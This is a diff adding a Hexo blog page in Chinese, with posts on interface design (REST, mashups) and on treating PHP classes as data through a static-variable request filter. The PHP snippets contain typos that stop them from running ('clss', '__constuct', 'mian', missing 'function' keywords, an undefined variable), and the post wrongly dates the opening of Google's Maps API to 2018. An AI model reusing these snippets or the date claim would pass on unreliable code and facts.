+<p>简单来说，客户端与服务器交流时，每次请求都与上一次无关。换而言之，每一次请求都不依赖于上一次请求。这样，我们将耦合降到了最低。当我需要资源时，只需要向服务器请求，我只知道向哪一个 URL 请求，根本无需知道我所请求的是分布式系统中的具体的哪一个，因为每一次请求对它们而言，都是崭新的。这样，不需要担心可拓展性。</p>
+<p>同时，RESTful 带来的好处还有：改善了可见性。由于每一次请求得到的数据都不应该超过一次请求所得到的数据，因此数据的完整性得到了保证。同时，提升了可靠性。如果请求出了问题，我们也只需要恢复一次请求便可以了。</p>
+<p>通过这一风格设计出来的接口，在通用性上会大大增强。</p>
+<h3 id="MASHUP-应用"><a href="#MASHUP-应用" class="headerlink" title="MASHUP 应用"></a>MASHUP 应用</h3><p>当接口设计得足够多，与之而来的，应用上的发展也开始了。</p>
+<p>mashup 最早起源于音乐界，将不同的音乐混合在一起的演出方式。在如今的 IT 界中，它表示一种应用做法：组合不同的 WEB 服务，合成一个应用。</p>
+<p>举个例子。 2018年，GOOGLE 公开了 GOOGLE MAP 的数据接口。因此，每个人都可以用它，和其它服务，比如天气服务接口，做出一个新的应用，在地图上显示每个城市的天气，或者做更有趣的，比如抄袭 Pokemon GO，做个捉妖怪的游戏。</p>
+<p>mashup 的组成分成三部分。一部分是服务提供商(者)，一部分是 mashup 站点，一部分是客户端。这三者每一部分都是可替代，我可以用不同服务商提供的 api，这个应用也可是另一个人来做，至于服务端，大多数是基于浏览器，你换成哪一个浏览器都可以。于是，mashup 属于松散耦合，可以说，是利用接口最好的诠释。</p>
+<hr>
+<p>又说了一大堆无用的东西。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/08/04/%E9%9D%A2%E5%90%91%E6%8E%A5%E5%8F%A3/" data-id="ck7h7792y0002633x26rl5flh" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-类、数据与设计模式" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/07/21/%E7%B1%BB%E3%80%81%E6%95%B0%E6%8D%AE%E4%B8%8E%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" class="article-date">
+  <time datetime="2019-07-20T16:00:00.000Z" itemprop="datePublished">2019-07-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/21/%E7%B1%BB%E3%80%81%E6%95%B0%E6%8D%AE%E4%B8%8E%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/">类、数据与设计模式</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>面向对象真是一个有趣的玩法。</p>
+<p>与函数式的写法不同，在函数式中，数据是不可变的。比如我在最开始设定的数据，到达代码的最后，也不会发生任何变化。产生出来的东西只是它们做的映射。比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$A &#x3D; 1</span><br><span class="line">do_someting($A)</span><br><span class="line">&#x2F;&#x2F;A 还是 1</span><br></pre></td></tr></table></figure>
+
+<p>但对一个类而言，它本身就代表着数据类型。而它的方法便是对这些数据的操作。</p>
+<p>在我最近看到的一个例子里，发现这么一种有趣的操作：一个类有两个静态变量，一个变量存储着从网页上传来的 JSON。另一个变量保存着过滤的参数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">clss A&#123;</span><br><span class="line">    static public $ajax &#x3D; array();  </span><br><span class="line">    static public $param &#x3D; array();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在其它的类文件里，就可以通过这个类保存从网页上传来的参数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class B&#123;</span><br><span class="line">    function __constuct()&#123;</span><br><span class="line">        if ($this-&gt;getRequest()-&gt;isXmlHttpRequest()) &#123;  </span><br><span class="line">             Yaf_Dispatcher::getInstance()-&gt;autoRender(FALSE);  </span><br><span class="line">             header(&quot;Content-type:application&#x2F;json;charset&#x3D;utf-8&quot;);  </span><br><span class="line">             $json &#x3D; file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);  </span><br><span class="line">             Filter::$ajax &#x3D; json_decode($json, true);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为是静态变量，于是，这个 A 类的变量就获得了参数。A 类的子类也得到了这个传过来的参数。于是，我们就可以用子类做一定的过滤。满足某个条件的参数，就放进 param 里。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">class para_Filter extends A&#123;</span><br><span class="line">    public static do_some_filter()&#123;</span><br><span class="line">        if (isset(self::$ajax[&#39;content&#39;])) &#123;</span><br><span class="line">            $content &#x3D; self::contentValid();</span><br><span class="line">            if ($banner[&#39;content&#39;] &#x3D;&#x3D; $content) &#123;</span><br><span class="line">                  echo &quot;content Error&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            self::$param[&#39;content&#39;] &#x3D; $content;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected static function contentValid()&#123;</span><br><span class="line">        $stringLength &#x3D; mb_strlen(self::$ajax[&#39;content&#39;],&#39;utf8&#39;);</span><br><span class="line">        if ($stringLength&lt;1 || $stringLength &gt;10000)&#123;</span><br><span class="line">            $content &#x3D; false;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $content &#x3D; self::$ajax[&#39;content&#39;];</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$content)&#123;</span><br><span class="line">                echo &quot;no content Error&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果 B 类的子类想要数据，那么只要从 para_Filter 那么得到就可以了。下面也就是我们主函数的部分。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class xx_Action extends B&#123;</span><br><span class="line">    public mian()&#123;</span><br><span class="line">        para_Filter::do_some_filter();</span><br><span class="line">        $content &#x3D; A::param[&#39;content&#39;];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public otherPost()&#123;</span><br><span class="line">        para_Filter::do_other_filter();</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这一套下来，也就大体实现了一个过滤器。如果我要的不是传上来的的 content，想要做新的拓展，那只要再创建新的函数、新的类就可以了。我不用管参数怎么来，只要知道，传过来的东西符不符合我的标准就好了。如果我过滤的标准发生了变化，只要改变 para_Filter 里的方法就好了，其它的地方可以一概不动。</p>
+<p>好玩的地方在于：可以看到，A 这个类没有方法，它就是一个数据的集合，一个数据结构。而它的子类，为它拓展了方法，但它们本身依然是数据结构。同时，它也随时在发生变化，而不是简单的映射。 虽然在我们的主函数里，没有对 A 这个类本身做过实例，也没有改变它的函数，但它在确确实实的产生了变化，而且还留在了它的基因里。</p>
+<p>因此，我把类看成数据本身，也没错吧 ：)</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/07/21/%E7%B1%BB%E3%80%81%E6%95%B0%E6%8D%AE%E4%B8%8E%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" data-id="ck7h758qi0001633xbc6o4nqv" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/03/07/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/27/CSRF-%E5%92%8C-XSS/">CSRF 和 XSS</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/13/%E7%BA%BF%E7%A8%8B%E9%94%81%EF%BC%88%E4%B8%80%EF%BC%89/">线程锁（一）</a>
+          </li>
+        
+          <li>
+            <a href="/2019/09/23/%E6%AE%B5%E5%BC%8F%E5%AD%98%E5%82%A8/">段式存储</a>
+          </li>
+        
+          <li>
+            <a href="/2019/09/08/%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%EF%BC%88%E4%BA%8C%EF%BC%89/">调度算法（二）</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
